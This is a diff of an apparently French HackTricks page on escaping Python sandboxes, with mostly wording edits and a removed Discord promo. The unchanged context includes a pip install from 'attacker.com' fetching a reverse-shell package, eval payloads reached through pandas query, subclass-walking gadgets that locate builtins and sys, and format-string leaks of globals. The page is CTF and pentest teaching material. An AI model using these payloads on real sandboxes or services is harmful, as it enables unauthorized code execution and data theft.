@@ -15,14 +15,6 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
 Voici quelques astuces pour contourner les protections des sandboxes Python et exécuter des commandes arbitraires.
 
 ## Bibliothèques d'exécution de commandes
@@ -95,7 +87,7 @@ Pour plus d'informations sur le fonctionnement de pickle, consultez ceci : [http
 
 Astuce partagée par **@isHaacK**
 
-Si vous avez accès à `pip` ou `pip.main()`, vous pouvez installer un paquet arbitraire et obtenir un reverse shell en appelant :
+Si vous avez accès à `pip` ou `pip.main()`, vous pouvez installer un paquet arbitraire et obtenir un shell inversé en appelant :
 ```bash
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
@@ -160,7 +152,7 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 ```
 ## Bypassing protections through encodings (UTF-7)
 
-Dans [**ce rapport**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy), UFT-7 est utilisé pour charger et exécuter du code python arbitraire à l'intérieur d'un apparent sandbox :
+Dans [**ce rapport**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy), l'UFT-7 est utilisé pour charger et exécuter du code python arbitraire à l'intérieur d'un apparent sandbox :
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
@@ -175,7 +167,7 @@ Il est également possible de le contourner en utilisant d'autres encodages, par
 
 ## Exécution Python sans appels
 
-Si vous êtes dans une prison python qui **ne vous permet pas de faire des appels**, il existe encore des moyens d'**exécuter des fonctions, du code** et des **commandes arbitraires**.
+Si vous êtes à l'intérieur d'une prison python qui **ne vous permet pas de faire des appels**, il existe encore des moyens d'**exécuter des fonctions, du code** et des **commandes arbitraires**.
 
 ### RCE avec [décorateurs](https://docs.python.org/3/glossary.html#term-decorator)
 ```python
@@ -462,7 +454,7 @@ defined_func.__class__.__base__.__subclasses__()
 ```
 ### Trouver des bibliothèques dangereuses chargées
 
-Par exemple, sachant qu'avec la bibliothèque **`sys`** il est possible d'**importer des bibliothèques arbitraires**, vous pouvez rechercher tous les **modules chargés qui ont importé sys à l'intérieur d'eux** :
+Par exemple, sachant qu'avec la bibliothèque **`sys`** il est possible de **importer des bibliothèques arbitraires**, vous pouvez rechercher tous les **modules chargés qui ont importé sys à l'intérieur d'eux** :
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
@@ -561,7 +553,7 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 ## Recherche Récursive des Builtins, Globals...
 
 {% hint style="warning" %}
-C'est juste **génial**. Si vous **cherchez un objet comme globals, builtins, open ou autre**, utilisez simplement ce script pour **trouver de manière récursive les endroits où vous pouvez trouver cet objet.**
+C'est juste **incroyable**. Si vous **cherchez un objet comme globals, builtins, open ou autre**, utilisez simplement ce script pour **trouver de manière récursive les endroits où vous pouvez trouver cet objet.**
 {% endhint %}
 ```python
 import os, sys # Import these to find more gadgets
@@ -711,7 +703,7 @@ people = PeopleInfo('GEEKS', 'FORGEEKS')
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
 get_name_for_avatar(st, people_obj = people)
 ```
-Notez comment vous pouvez **accéder aux attributs** de manière normale avec un **point** comme `people_obj.__init__` et **élément dict** avec **parenthèses** sans guillemets `__globals__[CONFIG]`
+Notez comment vous pouvez **accéder aux attributs** de manière normale avec un **point** comme `people_obj.__init__` et **élément de dict** avec **parenthèses** sans guillemets `__globals__[CONFIG]`
 
 Notez également que vous pouvez utiliser `.__dict__` pour énumérer les éléments d'un objet `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
@@ -755,12 +747,12 @@ Vérifiez également la page suivante pour des gadgets qui r**écupéreront des 
 ## Dissection des objets Python
 
 {% hint style="info" %}
-Si vous voulez **apprendre** sur le **bytecode python** en profondeur, lisez ce **super** article sur le sujet : [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+Si vous voulez **apprendre** en profondeur sur le **bytecode python**, lisez ce **super** article sur le sujet : [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
-Dans certains CTF, vous pourriez recevoir le nom d'une **fonction personnalisée où le flag** réside et vous devez voir les **internes** de la **fonction** pour l'extraire.
+Dans certains CTF, vous pourriez recevoir le nom d'une **fonction personnalisée où se trouve le flag** et vous devez examiner les **internes** de la **fonction** pour l'extraire.
 
-C'est la fonction à inspecter :
+Voici la fonction à inspecter :
 ```python
 def get_flag(some_input):
 var1=1
@@ -921,7 +913,7 @@ return "Nope"
 ```
 ### Création de l'objet code
 
-Tout d'abord, nous devons savoir **comment créer et exécuter un objet code** afin de pouvoir en créer un pour exécuter notre fonction leak :
+Tout d'abord, nous devons savoir **comment créer et exécuter un objet code** afin que nous puissions en créer un pour exécuter notre fonction leak :
 ```python
 code_type = type((lambda: None).__code__)
 # Check the following hint if you get an error in calling this
@@ -952,7 +944,7 @@ types.CodeType.__doc__
 ### Recréer une fonction divulguée
 
 {% hint style="warning" %}
-Dans l'exemple suivant, nous allons prendre toutes les données nécessaires pour recréer la fonction directement à partir de l'objet de code de la fonction. Dans un **vrai exemple**, toutes les **valeurs** pour exécuter la fonction **`code_type`** sont ce que **vous devrez divulguer**.
+Dans l'exemple suivant, nous allons prendre toutes les données nécessaires pour recréer la fonction directement à partir de l'objet de code de la fonction. Dans un **exemple réel**, toutes les **valeurs** pour exécuter la fonction **`code_type`** sont ce que **vous devrez divulguer**.
 {% endhint %}
 ```python
 fc = get_flag.__code__
@@ -1039,11 +1031,6 @@ will be bypassed
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-**Try Hard Security Group**
-
-<figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
 
 {% hint style="success" %}
 Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
